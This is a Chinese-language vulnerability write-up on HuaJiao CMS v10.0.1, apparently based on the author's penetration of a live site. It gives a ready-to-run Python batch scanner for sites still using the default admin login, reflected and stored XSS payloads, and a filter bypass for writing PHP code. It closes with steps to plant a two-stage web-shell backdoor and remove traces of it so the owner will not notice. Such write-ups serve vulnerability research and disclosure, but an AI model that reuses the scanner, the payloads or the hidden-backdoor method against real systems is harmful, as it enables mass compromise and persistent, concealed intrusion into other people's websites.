花椒CMS渗透测试后的漏洞总结
===============

前言
--

因为放了寒假，时间比较充裕，于是就开始学习网络安全。不学还好，结果一学就沉迷于此不可自拔。最近有个团队找到我，合作了一些内容。其中有一项就是渗透一个使用花椒CMS的网站，于是我欣然接受。经过两个小时的努力，摸到了花椒CMS的提权漏洞。  
因为好奇原因，就从网上下载了一套源码，自己搭建环境测试了一下。并通过代码审计进一步挖掘，整理了一些漏洞，供大家学习。  
源代码下载：<http://huajiaocms.com/index.html>  
**版本：v10.0.1 2021.02.27**

0x01 弱口令漏洞
----------

### 漏洞复现

漏洞位置`ip/adminx`  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-d0fd702df5493645cb91102bedbaf2b5bb5a5808.png)  
**账号**：HJCMS/HJCMS

### 漏洞网站批量寻找PoC

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-5b167cfda0da36c3c7f4379bb12e5ca30afa1928.png)  
如果网站存在使用默认账号口令的情况，就会弹窗提醒网站使用者“`您当前使用的是默认密码！请尽早修改默认密码换上更加复杂的密码，避免被有心人入侵`”，这个就可以作为判断**是否使用默认账号口令的重要依据。**  
先上完整版Python编写的PoC

```python
import time
import requests
import os
from requests.sessions import session
os.system('')
from requests.packages.urllib3.exceptions import InsecureRequestWarning
# 禁用安全请求警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import argparse
class poc():
    def title(self):
        print('''
+-----------------------------------------------------------------+
花椒CMS 弱口令检测
单个检测：python poc.py -u url
批量检测：python poc.py -f 1.txt
+-----------------------------------------------------------------+
''')
    def poc(self, target_ur):
        url = f'{target_ur}/adminx/'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}
        try:
            res = requests.get(url=url, headers=headers,verify=False,timeout=10)
            return res
        except Exception as e:
            print("\033[31m[x] 请求失败 \033[0m", e)
    def main(self, target_url, file):
        self.title()
        count=0
        if target_url:
            res=self.poc(target_url)
            if res.status_code==200 and "当前使用的是默认账号" in res.text:
                print(f'\033[31m[+] {target_url} 存在弱口令：HJCMS/HJCMS \033[0m')
        if file:
            for url in file:
                count += 1
                target_url = url.replace('\n', '')  #取消换行符
                #time.sleep(1)
                res=self.poc(target_url)
                try:
                    if res.status_code==200 and "当前使用的是默认账号" in res.text:
                        print(f'\033[31m[{count}] 响应值为200，{target_url} 存在弱口令：HJCMS/HJCCMS\033[0m')
                    else:
                        print(f'[{count}] 响应值为{res.status_code}，{target_url} 不存在弱口令')
                except Exception as e:
                    print("\033[31m[x] 请求失败 \033[0m", e)
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url',type=str,default=False,help="目标地址，带上http://")
    parser.add_argument("-f",'--file', type=argparse.FileType('r'),default=False,help="批量检测，带上http://")
    args = parser.parse_args()
    run = poc()
    run.main(args.url, args.file)
```

看这一行代码`if res.status_code==200 and "当前使用的是默认账号" in res.text:`，是一个if判断语句。如果这个判断语句成立，那么就会判定存在弱口令。他没有去通过输入密码等尝试登录后返回的信息判断是否存在弱口令，而是利用了程序本身的特性——**没有更改密码，就会弹窗提醒。**  
这样就大大降低和程序的复杂性和时间成本。

0x02 反射XSS漏洞
------------

### 漏洞复现

漏洞位置：`/Static/Home/VideoJS/index.php`  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-efccdf5c99b8904aefdc55c6afbd3526f38790b8.png)  
漏洞payload：`?Play=%27;alert(1);%27`  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-bcbc11d19363987870d64bfc9219aabf53eae69b.png)  
成功弹窗

### 漏洞分析

先打开`/Static/Home/VideoJS/index.php`，找到获取URL参数的部分代码。

```javascript
<script type="text/javascript">
    var vPath = '<?php include('Helper.php'); echo safeRequest($_GET['url']);?>';
    var logo = '';
    var myVideo=initVideo({
        id:'myVideo',
        url:vPath,
        ad:{
        pre:{
        url:'',
        link:'',
            },
            },
        logo:{
        url:'logo.png',
        width:'100px'
        },
        });
</script>

```

问题出在了`var vPath = '<?php include('Helper.php'); echo safeRequest($_GET['url']);?>';`，PHP获取URL参数后直接输出在文档中。尝试最简单的payload：`<script>alert("hack")</script>`。

发现没有弹窗，打开元素选择器查看一下。  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-6bfecbaf720dca9c30c323d38cf768abbeec62d4.png)  
代码成了`var vPath = '&lt;script&gt;alert(&quot;hack&quot;)&lt;/script&gt;';`尖括号被过滤了。  
`include('Helper.php');`,在Helper.php中过滤了参数  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-969db11989b452ce0b7cab249b8bb78f893dcc02.png)

```php
<?php
//过滤提交参数
function safeRequest($data){
    $data = stripslashes($data);//这里过滤斜杠
    $data = htmlspecialchars($data);//这里将标签转换为实体
    return $data;
}
?>
```

`$data = htmlspecialchars($data);//这里将标签转换为实体`这句话使插入失败。

但是好像不需要尖括号，这个PHP直接在js代码中输出的变量，所以闭合前面的语句，插入代码，再闭合后面的单引号就可以了。  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-760b319265b7c2f95d1a9820b730809373575326.png)  
代码成了`var vPath = '';alert(1);'';`,成功弹窗。

0x03 储存XSS漏洞
------------

漏洞位置：`/adminx/?Php=Home/Ad/AdJs`  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-1c4cdadc34aaa9a99d13f7e9b71c13524588b477.png)  
先尝试插入`<script>alert('hack')</script>`  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-ed275a1543596873a8a821f479115aacb28de97d.png)  
成功弹窗

0x04 后台提权
---------

还是刚才的位置`/Php/Admin/Home/Ad/AdJs.php`，通过代码审计，发现提交的代码被储存在一个PHP文件里。

```php
<?php

$postAdJs = $_POST['AdJs'];
if (isset($_POST['submit']) && isset($postAdJs)) {
    $postAdJs = str_replace('<?php','',$postAdJs);
$file = fopen("../HJSQL/Admin/Ad/AdminAdJs.php","w");
fwrite($file,$postAdJs);
fclose($file);  
?>
```

`$file = fopen("../HJSQL/Admin/Ad/AdminAdJs.php","w");`,打开/HJSQL/Admin/Ad/AdminAdJs.php，写入数据  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-e29bbcb9bcbc7fe41c2c8e3454dca5dfb7c009a7.png)  
没有其他代码，于是我尝试写入PHP代码。

先来最简单的`<?php phpinfo();?>`  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-346dca95916f03876102f9c8606c1ea65a36051d.png)  
发现只剩下了一部分，`<?php`被过滤掉了,返回去看看，发现忽略了一行代码`$postAdJs = str_replace('<?php','',$postAdJs);`，对传入的数据进行了过滤。  
把`<?php`过滤掉，我就把代码改成`<?p<?phphp phpinfo();?>`  
这样即使被过滤了，剩下的`<?p`与`hp`拼成新的`<?php`，点击提交查看文件。  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-a0c8f0d0f8097abf3db558e2a24e9207666e3cae.png)  
访问这个文件，发现成功执行。  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-5804433c80798482d6517a94215531be60cfff3c.png)  
但是这样的话每一次执行代码，都需要重新提交。如果网站的主人登录了网站，发现了这个文件的异常，一定会修改密码，消除文件的。  
于是我就留了一个后门。  
先在网站后台提交代码

```php
<?p<?phphp 
$url = $_GET['url'];
$myfile = fopen("newfile.php", "w") or die("Unable to open file!");
fwrite($myfile, $url);
fclose($myfile);
?>
```

这样代码就会提交到那个暴露的PHP文件当中，然后添加一个参数url，在url中再次写入新的代码，新的代码会被存进新建的newfile.php中  
然后访问`AdminAdJs.php`，提交下面这个参数  
`?url=<?php $url = $_GET['url']; $myfile = fopen("shell.php", "w") or die("Unable to open file!"); fwrite($myfile, $url); fclose($myfile); ?>`  
这样就会在访问newfile.php时提交url参数，url就会写入shell.php  
也就是说在newfile.php提交命令，在shell.php执行命令，留下了一个后门  
再删除之前AdminAdJs.php的恶意代码，恢复原样，除非登录服务器挨个文件检查是不会被发现的。  
**最终效果**  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-0262529294862392f0e02aac1ee9904a91b30278.png)

总结
--

使用花椒CMS的网站存在多处漏洞，甚至后台提权。但是我只在黑盒测试中发现了存储xss漏洞，其他漏洞都是审计出来的。还有很多getshell的位置，但是与上文类似，我就不提了。  
所以代码审计是真的香啊。